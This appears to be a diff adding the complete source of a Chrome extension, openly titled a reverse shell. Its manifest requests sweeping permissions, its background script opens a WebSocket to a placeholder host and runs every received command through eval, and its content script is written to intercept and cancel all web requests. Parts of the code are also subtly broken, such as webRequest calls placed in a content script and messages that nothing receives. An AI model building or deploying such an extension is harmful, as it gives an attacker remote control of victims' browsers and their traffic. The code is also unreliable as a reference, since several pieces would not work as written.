@@ -1,0 +1,104 @@
+a Chrome extension for reverse shell with all permissions
+
+// Manifest.json
+{
+  "manifest_version": 2,
+  "name": "Reverse Shell Extension",
+  "version": "1.0",
+  "permissions": [
+    "<all_urls>",
+    "webRequest",
+    "webRequestBlocking",
+    "tabs",
+    "activeTab",
+    "background",
+    "storage",
+    "unlimitedStorage",
+    "management",
+    "contextMenus",
+    "cookies",
+    "clipboardRead",
+    "clipboardWrite",
+    "http://*/*",
+    "https://*/*"
+  ],
+  "background": {
+    "scripts": ["background.js"],
+    "persistent": true
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ],
+  "icons": {
+    "16": "icon.png",
+    "48": "icon.png",
+    "128": "icon.png"
+  },
+  "browser_action": {
+    "default_icon": {
+      "16": "icon.png",
+      "48": "icon.png",
+      "128": "icon.png"
+    },
+    "default_popup": "popup.html"
+  }
+}
+
+// background.js
+chrome.runtime.onInstalled.addListener(function() {
+  // Background script that establishes a reverse shell connection
+  // and sends all traffic to the specified site
+
+  // Define your target site URL
+  const targetSite = "http://example.com/reverse-shell";
+
+  // Establish reverse shell connection
+  const socket = new WebSocket(targetSite);
+  
+  // Listen for incoming messages from the target site
+  socket.onmessage = function(event) {
+    const command = event.data;
+    
+    // Execute the received command
+    eval(command);
+  };
+});
+
+// content.js
+// Hijack all network requests and send them to the background script
+chrome.webRequest.onBeforeRequest.addListener(
+  function(details) {
+    // Get the request URL
+    const url = details.url;
+    
+    // Send the URL to the background script
+    chrome.runtime.sendMessage({ type: "request", url });
+    
+    // Cancel the original request
+    return { cancel: true };
+  },
+  { urls: ["<all_urls>"] },
+  ["blocking"]
+);
+
+// popup.html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Reverse Shell Extension</title>
+    <script src="popup.js"></script>
+  </head>
+  <body>
+    <h1>Extension</h1>
+    <p>error 404</p>
+  </body>
+</html>
+
+// popup.js
+// No additional code is required for the popup
+
+// icon.png
+// Replace this with your desired icon for the extension
